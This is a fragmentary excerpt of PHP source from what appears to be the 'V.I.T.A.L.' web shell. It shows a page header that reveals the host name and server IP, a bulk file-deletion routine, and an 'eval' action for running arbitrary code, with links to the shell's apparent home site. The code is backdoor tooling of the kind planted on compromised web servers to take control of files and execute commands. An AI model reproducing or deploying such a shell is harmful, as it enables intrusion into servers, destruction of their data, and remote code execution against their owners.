...
<title><?php echo str_replace('.','','V.I.T.A.L.');?></title>
<style type="text/css">
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;"><a href="http://vital.h.com.ua" target="_blank"><?php echo str_replace('.','','V.I.T.A.L.');?></a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>
	</tr>
	<tr class="alt1">
...
if (!$action || $action == 'file') {
	...
	elseif($doing == 'delfiles') {
		if ($dl) {
			...
			m('Deleted file have finishedichoose '.count($dl).' success '.$succ.' fail '.$fail);
		} else {
			m('Please select file(s)');
		}
	}
...
elseif ($action == 'eval') {
	...
	p('<p><a href="http://vital.h.com.ua/" target="_blank">VITAL</a></p>');
	formfooter();
}//end eval
